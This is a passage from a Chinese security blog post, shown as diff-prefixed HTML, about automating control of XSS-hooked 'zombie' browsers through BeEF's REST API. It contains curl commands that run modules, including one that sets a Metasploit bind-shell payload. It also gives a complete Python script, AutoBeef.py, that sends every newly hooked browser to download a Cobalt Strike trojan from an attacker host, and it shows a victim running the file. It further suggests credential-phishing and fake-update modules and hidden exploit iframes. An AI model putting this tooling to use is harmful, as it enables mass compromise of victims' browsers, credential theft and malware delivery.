+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -H <span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span> -d <span class="string">&#x27;&#123;&quot;choice&quot;:&quot;Windows&quot;,&quot;backing&quot;:&quot;Grey&quot;,&quot;imgsauce&quot;:&quot;http://0.0.0.0:3000/ui/media/images/beef.png&quot;&#125;&#x27;</span> http://192.168.1.133:3000/api/modules/ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso/117?token=dadd1be063d3a3b4339d84f5bdbbcbb25616b41d</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171905.png" alt="img"></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171922.png" alt="img"></p>
+<p>　　</p>
+<p>执行成功，并且返回了模块执行的id为35。假设我们提交的口令是：test333&#x2F;123456</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171927.png" alt="img"></p>
+<p>我们想要获取受害者提供的这些认证信息，这时候，我们需要这样请求：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/modules/浏览器session/模块<span class="built_in">id</span>/command_id？token=xxx</span><br></pre></td></tr></table></figure>
+
+<p> 比如</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171931.png" alt="img"></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171936.png" alt="img">  </p>
+<h2 id="Beef与metasploit联用"><a href="#Beef与metasploit联用" class="headerlink" title="Beef与metasploit联用"></a>Beef与metasploit联用</h2><p>　　我们当然不能忘记了metasploit这个神器。Beef与metasploit联用，实在是个大杀器。要想在beef加载metasploit，我们首先需要修改默认的配置文件，修改beef下<code>config.yaml</code>文件</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727171941.png" alt="img"></p>
+<p>把启用<code>metasploit</code>这个选项值改成<code>true</code></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172539.png" alt="img"></p>
+<p>另外,如果你的metasploit安装位置不包含在默认路径里，需要在<code>beef-xss/extensions/metasploit/config.yaml</code>的文件里设置一下</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172542.png" alt="img"></p>
+<p>然后我们启动msf加载<code>msgrpc</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x <span class="string">&quot;load msgrpc ServerHost=127.0.0.1 Pass=abc123&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172545.png" alt="img"></p>
+<p>重启beef即可加载metasploit模块</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172547.png" alt="img"></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172551.png" alt="img"></p>
+<p>　　同样的，如果你想调用Metasploit模块，步骤与前面的都一样，先查看改模块的id所需参数等信息，然后构造请求调用这个模块即可，关于metasploit模块调用，因为过两天就要考试了，没有时间做测试，有兴趣的朋友可以试一试。这个是 BeEF-RESTful-API的上一个请求示例。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span> -d <span class="string">&#x27;&#123;&quot;SRVPORT&quot;:&quot;3992&quot;, &quot;URIPATH&quot;:&quot;77345345345dg&quot;, &quot;PAYLOAD&quot;:&quot;generic/shell_bind_tcp&quot;&#125;&#x27;</span> -X POST http://xxxx/api/modules/浏览器session?token=xxx</span><br></pre></td></tr></table></figure>
+
+<h1 id="三-编写自动化控制脚本"><a href="#三-编写自动化控制脚本" class="headerlink" title="三. 编写自动化控制脚本"></a>三. 编写自动化控制脚本</h1><p>　　下面我尝试编写一个简单的自动控制hook主机的脚本，批量执行我提前设定的一些模块。我的思路是定时获取hook主机的session信息 ，存放到一个字典里，如果有新上线的僵尸主机的浏览器session，我们就通过API控制这个浏览器执行我们设定好的Beef模块，并把这个session添加到一个列表里，表示已经执行过。如果检测到某个session已经存在于列表中，说明已经执行过，就不再执行。测试的代码中，我用到了三个模块：Confirm Close Tab，Raw Javascript，Redirect Browser。第一个模块用于增加shell存活时间，第二个模块用于执行javascript代码，第三个模块使浏览器进行跳转下载，我把这个跳转地址指向一个Cobalt Strike生成的测试木马，并模拟受害者自动下载并运行恶意软件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># ** Author: ssooking</span></span><br><span class="line"><span class="comment"># ** Name： AutoBeef.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">hostlist = []</span><br><span class="line">hostdict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getauthkey</span>(<span class="params">host</span>):</span><br><span class="line">    apiurl =  host + <span class="string">&quot;api/admin/login&quot;</span></span><br><span class="line">    logindata = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;beef&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:<span class="string">&quot;beef&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    jdata = json.dumps(logindata)             <span class="comment"># 对数据进行JSON格式化编码</span></span><br><span class="line">    req = urllib2.Request(apiurl, jdata)      <span class="comment"># 生成页面请求的完整数据</span></span><br><span class="line">    response = urllib2.urlopen(req)           <span class="comment"># 发送页面请求</span></span><br><span class="line">    resdata = response.read()                 <span class="comment"># 获取服务器返回的页面信息，数据类型为str</span></span><br><span class="line">    jsondata =  json.loads(resdata)           <span class="comment"># 把数据解析成python对象，此时返回dict数据</span></span><br><span class="line">    <span class="keyword">return</span> jsondata[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getHookedBrowsersSession</span>(<span class="params">host,authkey</span>):</span><br><span class="line">    f = urllib2.urlopen(host + <span class="string">&quot;/api/hooks?token=&quot;</span> + authkey)</span><br><span class="line">    data = json.loads(f.read())</span><br><span class="line">    hookonline = data[<span class="string">&#x27;hooked-browsers&#x27;</span>][<span class="string">&#x27;online&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> hookonline:</span><br><span class="line">        hookid = hookonline[x][<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        hookip = hookonline[x][<span class="string">&#x27;ip&#x27;</span>]</span><br><span class="line">        hooksession = hookonline[x][<span class="string">&#x27;session&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> hookid <span class="keyword">not</span> <span class="keyword">in</span> hostdict:</span><br><span class="line">            hostdict[hookid] = hooksession</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;\n[+] Hooked host id:  &quot;</span> + <span class="built_in">bytes</span>(hookid) + <span class="string">&quot;\n   &gt;&gt;&gt; IP: &quot;</span> + <span class="built_in">bytes</span>(hookip) + <span class="string">&quot;\n   &gt;&gt;&gt; Session: &quot;</span> + hooksession</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendConfirm</span>(<span class="params">host, session, authkey</span>):</span><br><span class="line">    postdata = <span class="string">&#x27;&#123;&#125;&#x27;</span></span><br><span class="line">    url = host + <span class="string">&quot;api/modules/&quot;</span> + session + <span class="string">&quot;/177?token=&quot;</span> + authkey</span><br><span class="line">    <span class="comment">#print url</span></span><br><span class="line">    req = urllib2.Request(url, postdata)</span><br><span class="line">    req.add_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json; charset=UTF-8&quot;</span>)</span><br><span class="line">    f = urllib2.urlopen(req)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   &gt;&gt;&gt; [+] Module Confirm Close Tab has been Executed ! &quot;</span></span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execJavascript</span>(<span class="params">host, session, authkey</span>):</span><br><span class="line"></span><br><span class="line">    payload=&#123;</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;alert(&#x27;Hello by ssooking!&#x27;);&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    apiurl = host + <span class="string">&quot;api/modules/&quot;</span> + session + <span class="string">&quot;/169?token=&quot;</span> + authkey</span><br><span class="line">    jdata = json.dumps(payload)</span><br><span class="line">    req = urllib2.Request(apiurl, jdata)</span><br><span class="line">    req.add_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json; charset=UTF-8&quot;</span>)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    resdata = response.read()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   &gt;&gt;&gt; [+] Module Raw JavaScript has been Executed ! &quot;</span></span><br><span class="line">    <span class="keyword">return</span> resdata</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirectBrowser</span>(<span class="params">host, session, authkey</span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;redirect_url&quot;</span>:<span class="string">&quot;http://192.168.1.133:8000/plugins.exe&quot;</span>&#125;</span><br><span class="line">    apiurl = host + <span class="string">&quot;api/modules/&quot;</span> + session + <span class="string">&quot;/42?token=&quot;</span> + authkey</span><br><span class="line">    jdata = json.dumps(payload)</span><br><span class="line">    req = urllib2.Request(apiurl, jdata)</span><br><span class="line">    req.add_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json; charset=UTF-8&quot;</span>)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    resdata = response.read()</span><br><span class="line">    jsondata =  json.loads(resdata)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   &gt;&gt;&gt; [+] Module Redirect Browser has been Executed ! &quot;</span></span><br><span class="line">    <span class="keyword">return</span> jsondata</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createIFrame</span>(<span class="params">host, sessionId, authkey</span>):</span><br><span class="line">    postdata = <span class="string">&#x27;&#123;&quot;target&quot;:&quot;http://192.168.1.133:8000/&quot;&#125;&#x27;</span></span><br><span class="line">    url = host + <span class="string">&quot;api/modules/&quot;</span> + sessionId + <span class="string">&quot;/174?token=&quot;</span> + authkey</span><br><span class="line">    req = urllib2.Request(url, postdata)</span><br><span class="line">    req.add_header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json; charset=UTF-8&quot;</span>)</span><br><span class="line">    f = urllib2.urlopen(req)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   &gt;&gt;&gt; [+] Module Create Invisible Iframe has been Executed ! &quot;</span></span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">autoRunModules</span>(<span class="params">host,session,authkey</span>):</span><br><span class="line">    <span class="comment">#sendConfirm(host, session, authkey)</span></span><br><span class="line">    <span class="comment">#execJavascript(host, session, authkey)</span></span><br><span class="line">    redirectBrowser(host, session, authkey)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timeRun</span>(<span class="params">interval,host</span>):</span><br><span class="line">    authkey = getauthkey(host)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] AutoBeef is running....&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] BeEF KEY is : &quot;</span>+ authkey</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Base BeEF API URL: &quot;</span>+ host + <span class="string">&quot;api/&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Hook URL   : &quot;</span> + host + <span class="string">&quot;hook.js&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Hook Demo  : &quot;</span> + host + <span class="string">&quot;demos/basic.html&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            getHookedBrowsersSession(host, authkey)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> hostdict:</span><br><span class="line">                <span class="keyword">if</span> hostdict[x] <span class="keyword">not</span> <span class="keyword">in</span> hostlist:</span><br><span class="line">                    hostlist.append(hostdict[x])</span><br><span class="line">                    autoRunModules(host,hostdict[x],authkey)</span><br><span class="line">            time.sleep(interval)</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="built_in">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    beefhost = <span class="string">&quot;http://192.168.1.133:3000/&quot;</span></span><br><span class="line">    timeRun(<span class="number">3</span>,beefhost)</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>代码比较挫，没有什么要说的，容易遇到问题的地方是处理返回的数据类型，需要注意str，dict，list等数据类型的处理与转换。我先只执行一个<code>Redirect Browser</code>模块  <img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172556.png" alt="img"></p>
+<p>程序检测到有新的上线控制僵尸，会控制浏览器自动下载我们的恶意程序</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172601.png" alt="img"></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172603.png" alt="img"></p>
+<p>一旦受害者点击这个程序</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172608.png" alt="img"></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172614.png" alt="img"></p>
+<p>当受害者运行恶意软件时，我们可以获得控制权</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172618.png" alt="img"></p>
+<p> 当然我们也可以执行多个模块，你只需要在<code>autoRunModules</code>函数中添加你想执行的模块即可，比如我再测试执行<code>Confirm Close Tab</code>，<code>Raw Javascript</code>两个模块</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172621.png" alt="img"></p>
+<p> 但是需要注意的是，有些模块功能上是冲突的，不能一起执行，比如刚才的例子<code>Confirm Close Tab</code>和<code>Redirect Browser</code>。</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172623.png" alt="img"></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172627.png" alt="img"></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172631.png" alt="img"></p>
+<p> 我们可以执行多个模块，运行截图</p>
+<p> <img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172637.png" alt="img"></p>
+<p>到这里也就基本差不多了，只要思路够开阔，就有很多好玩的姿势，下面一些好玩的模块：</p>
+<blockquote>
+<p>Create Invisible Frame    + Browser Autopwn ：我们可以用metasploit的 Browser Autopwn模块生成一个攻击浏览器的url，然后创建一个隐藏的iframe指向这个url</p>
+<p>Raw Javascript ： 光是这个就能干很多事，不只是弹框哦～～</p>
+<p>Fake Notification Bar ，Fake Flash Update： 伪装浏览器插件，flash升级等，配合执行恶意软件</p>
+<p>Pretty Theft： 欺骗认证凭据的，可以试着自己做个模板，哪里能用到？。。报名统计啦，手机投票啦～～</p>
+</blockquote>
+<p>配合一些漏洞</p>
+<blockquote>
+<p>ms10-046　Microsoft Windows Shell LNK Code Execution</p>
+<p>CVE-2015-0096 Microsoft Windows Shell SMB LNK Code Execution Exploit</p>
+</blockquote>
+<p>不知道能不能配合永恒之蓝的msf模块～～～～</p>
+<p>对于手机，也有很多模块可以使用</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172646.png" alt="img"></p>
+<p><strong>关于代码</strong> </p>
+<p>如果你要使用AutoBeef，你需要对代码进行一些修改使其适应你的beef平台，比如beef主机地址，某个模块的id等等。你可以根据自己的需要添加相关模块，你也可以对其进行优化，使其更加健壮。其实官方也提供了beefapi的库，你可以在这里找到<a class="link"   target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py" >https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py<i class="fas fa-external-link-alt"></i></a>。通过调用里面的函数，我们也可以很方面地对beef进行控制，但是涉及到执行某个模块时，我们还是需要查看模块详细信息，提供其必要的参数。所以，我建议自己可以动手实现一下，只有这样我们才能进步提高，而且自己写的代码，可以根据自己的需要随时进行拓展修改，遇到问题也能很快解决。</p>
+<p>如果你要使用官方提供的beefAPI，你需要把它移植到你的python库中,kali里默认路径是这样：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> beefapi.py /usr/lib/python2.7/dist-packages/</span><br></pre></td></tr></table></figure>
+
+<p> 使用的时候从beefapi中导入即可，你可以查看帮助或者阅读其源代码</p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172652.png" alt="img"></p>
+<p><img src="https://gitee.com/ssooking/imgbed/raw/master/img/WebSecurity/20210727172657.png" alt="img"></p>
+<p><strong>遇到的问题</strong></p>
+<p>　　测试过程中我使用的是chrome和firefox，并且发现IE,360等浏览器无法正常hook。</p>
+<h1 id="四-最后的话"><a href="#四-最后的话" class="headerlink" title="四. 最后的话"></a>四. 最后的话</h1><p>　　只是一句话，不要随便点开一个链接。</p>
+<p>参考文章</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/beefproject/beef/wiki/BeEF-RESTful-API" >https://github.com/beefproject/beef/wiki/BeEF-RESTful-API<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py" >https://github.com/byt3bl33d3r/BeEF-API/blob/master/beefapi.py<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：利用BeEF REST API自动化控制僵尸主机</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2017-06-25 09:42:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2017/06/利用beef-rest-api自动化控制僵尸主机/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/BeEF/">#BeEF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/XSS/">#XSS</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2017/08/get-shell-by-powershell/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Get Shell By PowerShell</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2017/06/%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E7%9A%84%E6%B8%85%E6%B4%97/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">攻击流量的清洗</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8BeEF-REST-API%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8E%A7%E5%88%B6%E5%83%B5%E5%B0%B8%E4%B8%BB%E6%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">利用BeEF REST API自动化控制僵尸主机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80-%E5%89%8D%E8%A8%80"><span class="nav-number">2.</span> <span class="nav-text">一. 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C-%E9%80%9A%E8%BF%87API%E6%8E%A7%E5%88%B6beef"><span class="nav-number">3.</span> <span class="nav-text">二. 通过API控制beef</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96API-Key"><span class="nav-number">3.1.</span> <span class="nav-text">获取API Key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96hook%E4%B8%BB%E6%9C%BA%E5%88%97%E8%A1%A8"><span class="nav-number">3.2.</span> <span class="nav-text">获取hook主机列表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%97%E4%B8%BE%E5%8F%AF%E8%B0%83%E7%94%A8%E7%9A%84%E6%A8%A1%E5%9D%97%E4%BF%A1%E6%81%AF"><span class="nav-number">3.3.</span> <span class="nav-text">列举可调用的模块信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8CBeEF%E6%A8%A1%E5%9D%97"><span class="nav-number">3.4.</span> <span class="nav-text">执行BeEF模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="nav-number">3.5.</span> <span class="nav-text">获取模块执行结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Beef%E4%B8%8Emetasploit%E8%81%94%E7%94%A8"><span class="nav-number">3.6.</span> <span class="nav-text">Beef与metasploit联用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89-%E7%BC%96%E5%86%99%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8E%A7%E5%88%B6%E8%84%9A%E6%9C%AC"><span class="nav-number">4.</span> <span class="nav-text">三. 编写自动化控制脚本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B-%E6%9C%80%E5%90%8E%E7%9A%84%E8%AF%9D"><span class="nav-number">5.</span> <span class="nav-text">四. 最后的话</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
